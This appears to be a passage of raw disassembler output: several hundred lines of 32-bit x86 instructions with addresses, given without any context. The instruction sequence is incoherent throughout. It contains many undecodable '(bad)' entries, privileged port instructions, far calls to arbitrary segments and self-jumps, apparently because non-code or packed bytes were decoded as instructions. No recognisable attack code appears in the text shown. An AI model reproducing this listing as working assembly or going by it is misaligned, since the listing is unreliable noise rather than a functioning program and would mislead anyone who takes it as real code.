  413844:	popf   
  413845:	aas    
  413846:	jae    0x413824
  413848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413849:	arpl   WORD PTR [edi],si
  41384b:	push   0xffffffd5
  41384d:	fwait
  41384e:	push   esi
  41384f:	loopne 0x413856
  413851:	lods   eax,DWORD PTR ds:[esi]
  413852:	rcl    BYTE PTR [edi-0x4bf43f58],1
  413858:	hlt    
  413859:	or     eax,0x89e8ac2b
  41385e:	ds ror ebx,cl
  413861:	xor    bh,cl
  413863:	mov    ds:0x377c915c,al
  413868:	fs mov edi,0x96db1aa6
  41386e:	lea    edx,[ebx]
  413870:	cmc    
  413871:	xchg   esi,eax
  413872:	push   edi
  413873:	pop    ecx
  413874:	and    ch,dh
  413876:	or     DWORD PTR [edx+ecx*4-0x4e443b82],ebx
  41387d:	frstor [esi]
  41387f:	pop    edx
  413880:	popa   
  413881:	add    BYTE PTR [edx+0x61b3eb02],bl
  413887:	fwait
  413888:	inc    ecx
  413889:	push   esp
  41388a:	pop    ebp
  41388b:	jno    0x4138c9
  41388d:	dec    edx
  41388e:	(bad)  
  41388f:	jle    0x413852
  413891:	ror    DWORD PTR [esi],0xcd
  413894:	vpclmulqdq zmm2{k7},zmm0,ZMMWORD PTR [ecx],0x12
  41389b:	fwait
  41389c:	add    al,0xb4
  41389e:	mov    ch,0xa2
  4138a0:	jbe    0x413883
  4138a2:	test   al,0xa6
  4138a4:	mov    DWORD PTR [esp+ebx*2],eax
  4138a7:	neg    DWORD PTR [edi]
  4138a9:	sahf   
  4138aa:	sbb    bh,BYTE PTR [ecx-0x6e]
  4138ad:	jmp    0x413840
  4138af:	nop
  4138b0:	push   esp
  4138b1:	mov    bl,cl
  4138b3:	rol    DWORD PTR [edx+0x520d2701],cl
  4138b9:	mov    esi,0x757b05ca
  4138be:	add    esp,DWORD PTR [eax]
  4138c0:	(bad)  
  4138c1:	mov    edx,0x3d5db3e3
  4138c6:	scas   al,BYTE PTR es:[edi]
  4138c7:	mov    WORD PTR [ebx+0x3e],ss
  4138ca:	xchg   DWORD PTR [ebx+0x7766b4bd],esi
  4138d0:	cwde   
  4138d1:	int    0x6f
  4138d3:	imul   ecx,DWORD PTR [ecx+0x6cffa7f4],0x3
  4138da:	loop   0x413918
  4138dc:	nop
  4138dd:	fild   DWORD PTR [edx-0x2e]
  4138e0:	xor    ebx,ecx
  4138e2:	test   DWORD PTR [ebp-0x7a7ca196],esi
  4138e8:	push   ecx
  4138e9:	jmp    0x4138e9
  4138eb:	sbb    DWORD PTR [edx+ecx*1+0x42],edx
  4138ef:	lods   al,BYTE PTR ds:[esi]
  4138f0:	jb     0x41392d
  4138f2:	jle    0x4138ca
  4138f4:	mov    dl,0xa0
  4138f6:	in     al,0x61
  4138f8:	std    
  4138f9:	mov    ebx,ecx
  4138fb:	mov    cl,0x42
  4138fd:	xor    al,0x43
  4138ff:	imul   edi,DWORD PTR [edi],0xe9ce6704
  413905:	popf   
  413906:	imul   esp,DWORD PTR [ecx+eiz*4-0x45],0x7c
  41390b:	add    BYTE PTR [edx-0x5d5bc5da],al
  413911:	jae    0x413900
  413913:	lds    ebx,FWORD PTR [eax]
  413915:	pusha  
  413916:	and    esp,ebx
  413918:	popf   
  413919:	in     al,0x90
  41391b:	ret    0x480d
  41391e:	das    
  41391f:	inc    esp
  413920:	data16 jne 0x413987
  413923:	cli    
  413924:	push   esp
  413925:	mov    esi,0x4bde014c
  41392a:	xchg   ebx,eax
  41392b:	gs dec eax
  41392d:	jmp    0x413945
  41392f:	loop   0x41395c
  413931:	and    ah,ah
  413933:	sahf   
  413934:	test   eax,0xd5251162
  413939:	mov    ecx,0xaf9c9473
  41393e:	int3   
  41393f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413940:	lods   eax,DWORD PTR ds:[esi]
  413941:	push   eax
  413942:	test   eax,0x9a4b0139
  413947:	dec    ebx
  413948:	or     al,0x6b
  41394a:	mov    bl,0xa1
  41394c:	jb     0x4138f1
  41394e:	test   BYTE PTR ss:[edi-0x31f3247c],ch
  413955:	popf   
  413956:	sub    DWORD PTR [edx+esi*2],esi
  413959:	test   al,0xf4
  41395b:	out    0x1b,al
  41395d:	loopne 0x413908
  41395f:	xor    eax,0x4f64a929
  413964:	(bad)  
  413965:	rol    BYTE PTR [esi-0x13841590],1
  41396b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41396c:	das    
  41396d:	call   0xbfad:0x70a8d243
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    eax,0x93482b30
  41397a:	ins    DWORD PTR es:[edi],dx
  41397b:	inc    ecx
  41397c:	inc    edi
  41397d:	outs   dx,DWORD PTR ds:[esi]
  41397e:	pop    es
  41397f:	jns    0x4139ab
  413981:	sub    al,ah
  413983:	js     0x5bdaaeb4
  413989:	jmp    0xb20c5a17
  41398e:	dec    ebx
  41398f:	out    0xf1,eax
  413991:	shl    BYTE PTR [edi-0x954e407],0x6a
  413998:	mov    esp,edi
  41399a:	pop    esp
  41399b:	or     eax,0x67e029b6
  4139a0:	pop    eax
  4139a1:	lds    esi,FWORD PTR [esi+eiz*2]
  4139a4:	pop    ebx
  4139a5:	loopne 0x4139da
  4139a7:	(bad)  
  4139a8:	sahf   
  4139a9:	ret    0xd5a6
  4139ac:	jecxz  0x4139af
  4139ae:	(bad)  [esi]
  4139b0:	jge    0x413a21
  4139b2:	dec    eax
  4139b3:	push   ebp
  4139b4:	mov    bl,0xb9
  4139b6:	pop    ebx
  4139b7:	mov    ds:0x51fc4c89,al
  4139bc:	dec    ebx
  4139bd:	mov    al,0xc6
  4139bf:	or     eax,0xb4f1b670
  4139c4:	sbb    ch,0xd4
  4139c7:	std    
  4139c8:	gs push cs
  4139ca:	and    BYTE PTR [ebx],dl
  4139cc:	outs   dx,BYTE PTR ds:[esi]
  4139cd:	inc    eax
  4139ce:	rcl    ecx,1
  4139d0:	dec    esi
  4139d1:	sbb    al,0x7b
  4139d3:	adc    BYTE PTR [ebp-0xf],dl
  4139d6:	das    
  4139d7:	lods   eax,DWORD PTR ds:[esi]
  4139d8:	push   ds
  4139d9:	shl    DWORD PTR [esi],1
  4139db:	mov    cl,0x58
  4139dd:	test   DWORD PTR [ecx+0x6fa91702],esp
  4139e3:	dec    esi
  4139e4:	sub    al,BYTE PTR [esp+esi*1]
  4139e7:	iret   
  4139e8:	rcr    DWORD PTR [ecx-0xa],0xae
  4139ec:	outs   dx,BYTE PTR ds:[esi]
  4139ed:	les    edx,FWORD PTR [esi+0xf]
  4139f0:	repnz push ecx
  4139f2:	inc    edi
  4139f3:	adc    eax,0x505fa86a
  4139f8:	push   edi
  4139f9:	outs   dx,DWORD PTR ds:[esi]
  4139fa:	sbb    ecx,eax
  4139fc:	mov    WORD PTR [esi-0x32],ss
  4139ff:	ins    BYTE PTR es:[edi],dx
  413a00:	cs iret 
  413a02:	pusha  
  413a03:	push   0x3a
  413a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a06:	pop    ss
  413a07:	rol    BYTE PTR [esp+edx*1],0x7
  413a0b:	sbb    BYTE PTR [edi],0x6c
  413a0e:	inc    esi
  413a0f:	mov    eax,0x54a9151d
  413a14:	ror    DWORD PTR [ecx+0x7],1
  413a17:	sub    al,BYTE PTR [edx]
  413a19:	pusha  
  413a1a:	dec    esp
  413a1b:	hlt    
  413a1c:	aam    0xd6
  413a1e:	jle    0x413a82
  413a20:	fdivr  DWORD PTR [edx+edi*4]
  413a23:	adc    al,0x3c
  413a25:	retf   0x5e94
  413a28:	bound  ebx,QWORD PTR [edx+0x709bfd1a]
  413a2e:	mov    DWORD PTR es:[ebp-0x72],eax
  413a32:	push   0xffffff94
  413a34:	add    DWORD PTR [ebx+0x266937bf],0xffffffe2
  413a3b:	icebp  
  413a3c:	pop    ds
  413a3d:	cld    
  413a3e:	push   0xffffff94
  413a40:	(bad)  
  413a41:	lods   eax,DWORD PTR ds:[esi]
  413a42:	mov    eax,ds:0xd3639a25
  413a47:	jle    0x413a4d
  413a49:	xchg   esi,eax
  413a4a:	fs sub ecx,ebx
  413a4d:	(bad)  
  413a4e:	push   eax
  413a4f:	sbb    al,0xe1
  413a51:	add    bl,BYTE PTR [esi+0xd7b8a87]
  413a57:	frstor [eax]
  413a59:	test   edx,edx
  413a5b:	sub    edi,esi
  413a5d:	pop    ebx
  413a5e:	and    eax,0x975a3525
  413a63:	push   esp
  413a64:	std    
  413a65:	dec    edi
  413a66:	add    bh,BYTE PTR [ecx+0x1c6a91d4]
  413a6c:	sbb    eax,0xc9eb8a93
  413a71:	aam    0x65
  413a73:	inc    DWORD PTR [eax-0x2381c867]
  413a79:	cmc    
  413a7a:	jne    0x413a4c
  413a7c:	adc    eax,0x382eb2ad
  413a81:	(bad)  
  413a82:	cdq    
  413a83:	clc    
  413a84:	rol    DWORD PTR [ebp-0x66],cl
  413a87:	shl    cl,cl
  413a89:	outs   dx,BYTE PTR ds:[esi]
  413a8a:	enter  0x569c,0xa8
  413a8e:	inc    eax
  413a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a90:	dec    ebx
  413a91:	mov    dl,BYTE PTR [edi]
  413a93:	jae    0x413ac1
  413a95:	into   
  413a96:	retf   0xc49e
  413a99:	into   
  413a9a:	push   esp
  413a9b:	xchg   edi,eax
  413a9c:	rol    DWORD PTR [edx],cl
  413a9e:	aaa    
  413a9f:	add    BYTE PTR [ecx],0x2a
  413aa2:	ret    0xca60
  413aa5:	imul   edi,DWORD PTR [edi-0x5303145c],0xc1f6e5a2
  413aaf:	in     al,0xfd
  413ab1:	push   ebx
  413ab2:	pop    esp
  413ab3:	xor    al,BYTE PTR [eax]
  413ab5:	push   cs
  413ab6:	push   esp
  413ab7:	mov    ?,ecx
  413ab9:	shr    dh,0xb8
  413abc:	xchg   edi,eax
  413abd:	xor    BYTE PTR [eax+0x6c309388],dl
  413ac3:	leave  
  413ac4:	lahf   
  413ac5:	(bad)  
  413ac6:	jmp    0x413ac6
  413ac8:	lock sub BYTE PTR [edx-0x377839da],bh
  413acf:	mov    ch,0x84
  413ad1:	sbb    dl,BYTE PTR [ebx+ecx*1-0x2328ecb6]
  413ad8:	add    bh,BYTE PTR [edi]
  413ada:	lea    esp,[ebx+edi*4]
  413add:	sub    esp,eax
  413adf:	mov    esi,0x9772f22
  413ae4:	push   esi
  413ae5:	ds lock adc eax,0x5b704e0c
  413aec:	pop    ss
  413aed:	push   esp
  413aee:	jl     0x413b38
  413af0:	add    eax,0xf9aefa0c
  413af5:	nop
  413af6:	pop    esp
  413af7:	call   0x11ea8ef4
  413afc:	jae    0x413a95
  413afe:	sub    eax,0xaed01404
  413b03:	sbb    al,0x68
  413b05:	push   eax
  413b06:	scas   al,BYTE PTR es:[edi]
  413b07:	loope  0x413a9d
  413b09:	mov    ebp,0x40af2670
  413b0e:	rcl    BYTE PTR [edx+0x4c93b72c],cl
  413b14:	xor    eax,0x6b085c85
  413b19:	pop    edi
  413b1a:	arpl   di,si
  413b1c:	cmp    al,0x69
  413b1e:	or     BYTE PTR [ecx+0x55804bfe],bl
  413b24:	mov    bl,0xf4
  413b26:	aad    0x22
  413b28:	dec    edi
  413b29:	add    bl,BYTE PTR [eax-0x64eeb396]
  413b2f:	pop    eax
  413b30:	xchg   DWORD PTR [ecx+0x588893e4],eax
  413b36:	call   0x4f8f:0x1666984f
  413b3d:	mov    ds:0x338404ad,al
  413b42:	leave  
  413b43:	pop    ebx
  413b44:	ins    DWORD PTR es:[edi],dx
  413b45:	and    al,0xdf
  413b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b49:	pop    esp
  413b4a:	cmc    
  413b4b:	jl     0x413b36
  413b4d:	mov    ds:0x33304b1b,al
  413b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b53:	push   ds
  413b54:	test   DWORD PTR [ebx+0x21],0x33ba72ae
  413b5b:	in     eax,0x8e
  413b5d:	es push ebx
  413b5f:	mov    eax,0xfba4a8da
  413b64:	and    BYTE PTR [edi-0x3f],bh
  413b67:	cwde   
  413b68:	mov    ch,0xfc
  413b6a:	cmp    eax,0xa22c2434
  413b6f:	push   edx
  413b70:	pop    es
  413b71:	xor    BYTE PTR [eax],ch
  413b73:	mov    es,ecx
  413b75:	fst    DWORD PTR [edx+ecx*1]
  413b78:	jl     0x413bf8
  413b7a:	push   ecx
  413b7b:	shr    BYTE PTR [edx],0xb2
  413b7e:	test   BYTE PTR [ebx],0xc9
  413b81:	int    0x8b
  413b83:	xchg   ecx,eax
  413b84:	mov    ebx,0xd6cbfdbf
  413b89:	mov    WORD PTR [edx+0x7c617d73],es
  413b8f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b91:	sbb    eax,0x35c2916c
  413b96:	jb     0x413bed
  413b98:	aad    0xe5
  413b9a:	aaa    
  413b9b:	jle    0x413c07
  413b9d:	adc    BYTE PTR [ebx],al
  413b9f:	cmp    al,BYTE PTR [ebp+0x2]
  413ba2:	imul   edx,DWORD PTR [esi-0x5f029e18],0xffffffab
  413ba9:	nop
  413baa:	mov    esi,edi
  413bac:	test   eax,0xf196766d
  413bb1:	mov    bh,0x4d
  413bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bb4:	mov    ebx,0xc0e6febf
  413bb9:	mov    ds:0xb429ed3,al
  413bbe:	call   0x28eebbd5
  413bc3:	mov    BYTE PTR [ebp-0x5c876de1],bl
  413bc9:	repz dec ebx
  413bcb:	mov    edx,0x52e25350
  413bd0:	sub    ebx,ebp
  413bd2:	adc    al,0xb1
  413bd4:	dec    ebp
  413bd5:	gs (bad) 
  413bd7:	jecxz  0x413bee
  413bd9:	retf   
  413bda:	push   es
  413bdb:	adc    DWORD PTR [esi],edx
  413bdd:	cwde   
  413bde:	xchg   ebp,eax
  413bdf:	adc    al,0x6e
  413be1:	mov    bh,0x96
  413be3:	mov    edx,DWORD PTR [ebp-0x620fbb0]
  413be9:	fstp   st(3)
  413beb:	or     ecx,ecx
  413bed:	xor    al,0xa0
  413bef:	cvttps2pi mm4,xmm2
  413bf2:	pop    esp
  413bf3:	ret    0xe2fa
  413bf6:	xchg   edx,eax
  413bf7:	jbe    0x413b7f
  413bf9:	sub    edx,ebp
  413bfb:	dec    esi
  413bfc:	test   al,0xd4
  413bfe:	mov    al,0x2a
  413c00:	jl     0x413c01
  413c02:	push   edx
  413c03:	pop    es
  413c04:	das    
  413c05:	sub    eax,0xb092010b
  413c0a:	push   ds
  413c0b:	ret    
  413c0c:	test   edx,ebx
  413c0e:	int3   
  413c0f:	mov    cl,0xa3
  413c11:	iret   
  413c12:	push   edx
  413c13:	nop
  413c14:	fdivr  QWORD PTR [eax]
  413c16:	dec    ebx
  413c17:	sub    ebp,DWORD PTR [eax]
  413c19:	xchg   ebp,eax
  413c1a:	mov    ecx,edx
  413c1c:	loop   0x413c96
  413c1e:	mov    ebp,0xed32e5d
  413c23:	inc    edi
  413c24:	sub    ebx,edi
  413c26:	aad    0x6b
  413c28:	loop   0x413c52
  413c2a:	add    BYTE PTR [eax-0x31450187],al
  413c30:	shl    BYTE PTR [ebp-0xe38ea2e],1
  413c36:	bnd jns 0x413c38
  413c39:	xor    al,0x44
  413c3b:	test   al,0x2a
  413c3d:	(bad)  
  413c3f:	push   ss
  413c40:	jb     0x413c95
  413c42:	sahf   
  413c43:	jle    0x413c6b
  413c45:	popa   
  413c46:	sahf   
  413c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c48:	sar    BYTE PTR [edi],cl
  413c4a:	sub    cl,BYTE PTR [edx-0xf17c24a]
  413c50:	sbb    eax,DWORD PTR ds:0xc8493463
  413c56:	les    ebx,FWORD PTR [eax-0x6a975597]
  413c5c:	add    edi,DWORD PTR [edx]
  413c5e:	jmp    FWORD PTR [ebp-0x2f]
  413c61:	call   0x3475:0xfdcf3567
  413c68:	in     eax,0x9d
  413c6a:	(bad)  
  413c6b:	aas    
  413c6c:	xchg   ebx,eax
  413c6d:	jo     0x413c13
  413c6f:	xor    dl,al
  413c71:	jo     0x413c19
  413c73:	test   al,0x80
  413c75:	stos   BYTE PTR es:[edi],al
  413c76:	sahf   
  413c77:	adc    BYTE PTR [edi-0x27],ah
  413c7a:	pusha  
  413c7b:	in     eax,dx
  413c7c:	add    cl,cl
  413c7e:	or     BYTE PTR [edx+0xa9cf75a],al
  413c84:	mov    cl,0x3d
  413c86:	test   ebx,0xaf53c032
  413c8c:	mov    DWORD PTR [edi-0x79],ecx
  413c8f:	cmp    al,0x7e
  413c91:	adc    eax,0x394ee826
  413c96:	test   DWORD PTR [esi-0xe1d4bc0],ecx
  413c9c:	push   ebp
  413c9d:	and    ch,BYTE PTR [ebp+0x718fdfed]
  413ca3:	pop    DWORD PTR [esi-0x1b]
  413ca6:	es aaa 
  413ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ca9:	jmp    0x936:0x97b40954
  413cb0:	(bad)  
  413cb1:	sti    
  413cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cb3:	nop
  413cb4:	xor    esi,edx
  413cb6:	add    eax,0xbc596689
  413cbb:	add    eax,0x690c3b36
  413cc0:	jne    0x413c7b
  413cc2:	(bad)  
  413cc4:	dec    edx
  413cc5:	jno    0x413d0f
  413cc7:	cld    
  413cc8:	or     eax,0x283b762
  413ccd:	ret    
  413cce:	bound  edx,QWORD PTR [ebx-0x46]
  413cd1:	sub    eax,0x331e478e
  413cd6:	sbb    ah,BYTE PTR [ecx-0x57]
  413cd9:	(bad)  
  413cdb:	mov    al,ds:0xa489c9b8
  413ce0:	nop
  413ce1:	(bad)  
  413ce3:	retf   0xb7e0
  413ce6:	xchg   BYTE PTR [eax-0x172e55fd],dh
  413cec:	jp     0x413c98
  413cee:	or     DWORD PTR [eax],esp
  413cf0:	lea    esi,[eax-0x1412e402]
  413cf6:	dec    ebp
  413cf7:	xor    esi,DWORD PTR [ebx]
  413cf9:	pop    ds
  413cfa:	(bad)  
  413cfb:	js     0x413c8f
  413cfd:	imul   ebx,DWORD PTR [edx],0xffffffb4
  413d00:	and    eax,0xaee523d
  413d05:	les    edi,FWORD PTR [edx]
  413d07:	dec    edi
  413d08:	js     0x413cd6
  413d0a:	mov    dh,0xe
  413d0c:	cmp    BYTE PTR [esi],cl
  413d0e:	pop    ss
  413d0f:	mov    ecx,0x81d3cb7b
  413d14:	fcomi  st,st(5)
  413d16:	jne    0x413d36
  413d18:	add    eax,0x622a353f
  413d1d:	test   eax,0x13494486
  413d22:	aas    
  413d23:	call   0xd996595
  413d28:	push   eax
  413d29:	repz xor bh,BYTE PTR [ebx+0x56]
  413d2d:	addr16 lahf 
  413d2f:	in     eax,dx
  413d30:	pop    edi
  413d31:	dec    ebx
  413d32:	sub    DWORD PTR [ebp-0x59],edi
  413d35:	(bad)  
  413d37:	xchg   esp,eax
  413d38:	xor    edx,esp
  413d3a:	push   ebp
  413d3b:	sub    DWORD PTR fs:[ebx-0x15e12577],esi
  413d42:	mov    bh,0xb3
  413d44:	add    ch,BYTE PTR [eax+0x18]
  413d47:	cmp    DWORD PTR [esi-0x2c],edx
  413d4a:	fsubr  DWORD PTR [ebx]
  413d4c:	arpl   cx,di
  413d4e:	mov    edx,ebx
  413d50:	push   ss
  413d51:	out    0x92,eax
  413d53:	pushf  
  413d54:	push   esp
  413d55:	and    ch,0x83
  413d58:	retf   0x3982
  413d5b:	cmc    
  413d5c:	xchg   BYTE PTR [ebx],bl
  413d5e:	push   eax
  413d5f:	fmul   QWORD PTR [edi-0x2d]
  413d62:	mov    ah,ch
  413d64:	adc    DWORD PTR [ebx-0x1d031be5],ecx
  413d6a:	mov    bh,0x22
  413d6c:	(bad)  
  413d6d:	(bad)  
  413d6e:	xchg   ebp,eax
  413d6f:	inc    edi
  413d70:	jmp    0x8d62:0x90e27292
  413d77:	sbb    eax,0x9be9d447
  413d7c:	stos   DWORD PTR es:[edi],eax
  413d7d:	in     al,0x3a
  413d7f:	stos   BYTE PTR es:[edi],al
  413d80:	xor    DWORD PTR [eax],esp
  413d82:	sbb    edx,DWORD PTR [esi]
  413d84:	imul   esi,DWORD PTR [ebx+0x57],0xffffff9b
  413d88:	loopne 0x413d53
  413d8a:	ror    ebp,0xb1
  413d8d:	jb     0x413d26
  413d8f:	mov    ecx,0x1513d14c
  413d94:	push   edx
  413d95:	(bad)  
  413d97:	mov    eax,ds:0x4da6b37c
  413d9c:	shl    DWORD PTR [edi-0x46eab004],1
  413da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413da3:	xlat   BYTE PTR ds:[ebx]
  413da4:	adc    edi,ecx
  413da6:	xor    BYTE PTR [eax-0x19],ch
  413da9:	adc    BYTE PTR [ecx-0x2a],dl
  413dac:	inc    eax
  413dad:	xor    bl,ah
  413daf:	lods   eax,DWORD PTR fs:[esi]
  413db1:	push   ds
  413db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413db3:	mov    al,ds:0x4394cb0
  413db8:	loop   0x413d4f
  413dba:	retf   
  413dbb:	(bad)  
  413dbc:	mov    ?,WORD PTR [ebx-0xd]
  413dbf:	stc    
  413dc0:	neg    BYTE PTR [edx-0x57d06ad0]
  413dc6:	je     0x413e39
  413dc8:	or     BYTE PTR [edx],0xbb
  413dcb:	cli    
  413dcc:	pop    ds
  413dcd:	xchg   DWORD PTR [esp+ecx*4-0x2a],ebx
  413dd1:	lods   al,BYTE PTR ds:[esi]
  413dd2:	rcl    BYTE PTR [esi-0x26],cl
  413dd5:	mov    dh,0xa4
  413dd7:	or     al,0x73
  413dd9:	dec    edi
  413dda:	or     eax,0xd6667f66
  413ddf:	sub    dh,BYTE PTR [ecx+0x0]
  413de2:	xchg   ebp,eax
  413de3:	test   eax,0x46061ccf
  413de8:	jge    0x413d78
  413dea:	(bad)  
  413deb:	shr    DWORD PTR [ebx+0x15c43bad],cl
  413df1:	div    bh
  413df3:	mov    cl,0xb0
  413df5:	repnz ds cwde 
  413df8:	add    ch,BYTE PTR [eax]
  413dfa:	jnp    0x413df1
  413dfc:	out    dx,al
  413dfd:	pop    edx
  413dfe:	jb     0x413ded
  413e00:	jbe    0x413e29
  413e02:	ins    DWORD PTR es:[edi],dx
  413e03:	cdq    
  413e04:	arpl   WORD PTR ds:0x29f0cc4e,si
  413e0a:	xor    esp,DWORD PTR [eax+0x39e246fb]
  413e10:	and    cl,ah
  413e12:	xchg   ebp,eax
  413e13:	pop    edi
  413e14:	xchg   edi,eax
  413e15:	pop    ds
  413e16:	cwde   
  413e17:	adc    bh,BYTE PTR [eax]
  413e19:	mov    ebp,DWORD PTR [edi-0x514d7edc]
  413e1f:	xor    DWORD PTR [esi+0x42],ebp
  413e22:	sub    dl,al
  413e24:	push   ebx
  413e25:	mov    al,ds:0x370fc028
  413e2a:	loop   0x413dcd
  413e2c:	jo     0x413df1
  413e2e:	dec    edx
  413e2f:	sbb    cl,BYTE PTR [ebp+0x47]
  413e32:	add    DWORD PTR [ebp+eax*8+0x6d6cd40c],esp
  413e39:	xchg   edx,eax
  413e3a:	mov    ?,WORD PTR [ebx+0x37dcdd86]
  413e40:	mov    DWORD PTR [edx-0x17076e6d],edx
  413e46:	inc    esi
  413e47:	adc    ebp,esi
  413e49:	cmc    
  413e4a:	call   0xd9f1b13a
  413e4f:	cmp    ebx,DWORD PTR [edi+0x4b]
  413e52:	out    0xe6,eax
  413e54:	push   ebx
  413e55:	les    edx,FWORD PTR [esi-0x4f4a205c]
  413e5b:	mov    cl,0x4c
  413e5d:	mov    bl,0x12
  413e5f:	inc    ecx
  413e60:	test   eax,0xb01782c4
  413e65:	(bad)  
  413e66:	fisubr DWORD PTR [edx+0x14]
  413e69:	mov    dl,0x31
  413e6b:	ret    
  413e6c:	mov    dl,0xf
  413e6e:	jne    0x413e80
  413e70:	pushf  
  413e71:	adc    DWORD PTR [ebx],ebp
  413e73:	adc    dl,BYTE PTR [esi-0x363736b6]
  413e79:	or     BYTE PTR [ecx+0x8],dl
  413e7c:	pop    esp
  413e7d:	outs   dx,DWORD PTR ds:[esi]
  413e7e:	pop    edi
  413e7f:	jle    0x413ea1
  413e81:	jne    0x413e7d
  413e83:	adc    edi,DWORD PTR [ebx]
  413e85:	inc    edx
  413e86:	je     0xb69db46
  413e8c:	jg     0x413e80
  413e8e:	push   eax
  413e8f:	mov    edi,0xfe3720b8
  413e94:	xor    al,0xf9
  413e96:	ror    BYTE PTR [ecx+eax*1],cl
  413e99:	jo     0x413eb9
  413e9b:	cmp    ch,BYTE PTR [edi]
  413e9d:	dec    ebp
  413e9e:	addr16 hlt 
  413ea0:	inc    ecx
  413ea1:	aam    0x57
  413ea3:	das    
  413ea4:	mov    bl,0xfe
  413ea6:	add    eax,0x24932f81
  413eab:	adc    DWORD PTR [edx],ebp
  413ead:	jno    0x413eb0
  413eaf:	mov    bh,0xea
  413eb1:	in     eax,dx
  413eb2:	test   eax,0x9d26b80e
  413eb7:	rol    DWORD PTR [ebx+0x4d02d9fb],cl
  413ebd:	mov    eax,ds:0x16d0308d
  413ec2:	xlat   BYTE PTR ds:[ebx]
  413ec3:	inc    ebx
  413ec4:	out    dx,al
  413ec5:	outs   dx,BYTE PTR ds:[esi]
  413ec6:	fisttp DWORD PTR [edi-0x14]
  413ec9:	adc    bl,bh
  413ecb:	and    DWORD PTR [esi-0x536e8ab6],0xffffffa6
  413ed2:	pop    esi
  413ed3:	xlat   BYTE PTR ds:[ebx]
  413ed4:	rcl    DWORD PTR [esi],1
  413ed6:	arpl   WORD PTR [esi-0x1d],dx
  413ed9:	mov    eax,DWORD PTR [esi]
  413edb:	scas   al,BYTE PTR es:[edi]
  413edc:	fidivr WORD PTR [ebp+0x3e]
  413edf:	push   ebp
  413ee0:	pop    es
  413ee1:	adc    DWORD PTR ds:0x7fde5d2f,0xffffffb3
  413ee8:	sub    BYTE PTR [edi-0x69],ch
  413eeb:	push   esp
  413eec:	fld    TBYTE PTR [edi-0x41]
  413eef:	sar    ah,cl
  413ef1:	aaa    
  413ef2:	sub    esp,esi
  413ef4:	out    dx,eax
  413ef5:	mov    ch,0x4f
  413ef7:	test   al,0x82
  413ef9:	nop
  413efa:	push   0xb2ddb0a0
  413eff:	push   eax
  413f00:	mov    BYTE PTR [eax+0x1c9019b7],dl
  413f06:	cmc    
  413f07:	push   cs
  413f08:	jecxz  0x413ef1
  413f0a:	or     ah,cl
  413f0c:	in     al,0xc5
  413f0e:	push   cs
  413f0f:	xor    DWORD PTR [eax-0x2b33e0d6],ebx
  413f15:	daa    
  413f16:	mov    al,ds:0xed439b8e
  413f1b:	jnp    0x413eb0
  413f1d:	ins    BYTE PTR es:[edi],dx
  413f1e:	js     0x413ee3
  413f20:	or     ebx,DWORD PTR [ebx]
  413f22:	mov    BYTE PTR [edx-0x42],al
  413f25:	jge    0x413f08
  413f27:	mov    bh,0x8
  413f29:	out    dx,al
  413f2a:	pushf  
  413f2b:	js     0x413f45
  413f2d:	or     BYTE PTR [edi-0x22],dl
  413f30:	or     ch,BYTE PTR [edi]
  413f32:	enter  0x4f24,0x1a
  413f36:	nop
  413f37:	add    dh,BYTE PTR fs:[ecx]
  413f3a:	or     al,0xed
  413f3c:	add    DWORD PTR [eax+0x18],eax
  413f3f:	push   ss
  413f40:	(bad)  
  413f41:	jnp    0x413f00
  413f43:	inc    esi
  413f44:	pop    ds
  413f45:	push   0xffffffcb
  413f47:	mov    WORD PTR [edi],ss
  413f49:	xor    DWORD PTR [esi],eax
  413f4b:	sahf   
  413f4c:	stc    
  413f4d:	and    edi,DWORD PTR [edx-0x1299a930]
  413f53:	dec    ebp
  413f54:	out    dx,eax
  413f55:	jnp    0x413f9c
  413f57:	imul   ebp,DWORD PTR [eax+0x20],0x73
  413f5b:	dec    edx
  413f5c:	mov    BYTE PTR [eax-0x5346f6d9],dh
  413f62:	cld    
  413f63:	iret   
  413f64:	inc    edx
  413f65:	jb     0x413fcc
  413f67:	mov    eax,0x7e4c1f18
  413f6c:	or     DWORD PTR [edx+0x1c435aaf],0x32a18aab
  413f76:	pushf  
  413f77:	xchg   edi,eax
  413f78:	mov    ebp,0xf1e55e7b
  413f7d:	je     0x413f17
  413f7f:	or     al,0xb
  413f81:	test   DWORD PTR ds:0xd42f612f,ebx
  413f87:	cmc    
  413f88:	fs pop esi
  413f8a:	xor    al,0x48
  413f8c:	into   
  413f8d:	lahf   
  413f8e:	jns    0x413f84
  413f90:	add    BYTE PTR [edi+0x2f],ch
  413f93:	lds    esi,FWORD PTR [esi]
  413f95:	adc    al,BYTE PTR [edi+0x2ce906e7]
  413f9b:	lods   al,BYTE PTR ds:[esi]
  413f9c:	push   ecx
  413f9d:	rol    ecx,0x2b
  413fa0:	or     dl,BYTE PTR [eax+ecx*4]
  413fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa4:	mov    eax,0xf098534b
  413fa9:	mov    ebx,0x6a21c697
  413fae:	rol    DWORD PTR [ecx+0x30],0x9d
  413fb2:	outs   dx,DWORD PTR fs:[esi]
  413fb4:	hlt    
  413fb5:	jno    0x413fa1
  413fb7:	mov    esi,0x9ad334b9
  413fbc:	aad    0x9c
  413fbe:	int3   
  413fbf:	adc    eax,0x6495fc7b
  413fc4:	push   cs
  413fc5:	cwde   
  413fc6:	call   0x9064:0x3b48914
  413fcd:	inc    edi
  413fce:	in     al,dx
  413fcf:	cmp    ecx,edx
  413fd1:	add    ah,bl
  413fd3:	dec    edi
